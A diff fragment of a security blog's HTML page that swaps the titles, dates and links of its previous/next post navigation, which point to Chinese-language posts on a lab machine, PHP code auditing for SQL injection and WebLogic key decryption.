                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1854,11 +1738,11 @@ admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;
               >
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Halfhour靶机-Maze-通配符漏洞</span
+                  >原生PHP代码审计-sql注入</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-09-18T00:00:00&#43;00:00">18 September 2025</time>
+                    <time datetime="2025-09-20T00:00:00&#43;00:00">20 September 2025</time>
                   
                 </span>
               </span>
@@ -1867,14 +1751,14 @@ admin/comment.php?action=delbyip&amp;token=844dcfdf25339db310d07c152cdb3794&amp;
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/posts/code2php/">
+            <a class="flex text-right group ml-3" href="/posts/weblogic-key/">
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >原生PHP代码审计-文件方面</span
+                  >Weblogic-拿到密钥解密</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-09-21T00:00:00&#43;00:00">21 September 2025</time>
+                    <time datetime="2025-09-22T00:00:00&#43;00:00">22 September 2025</time>
                   
                 </span>
               </span>
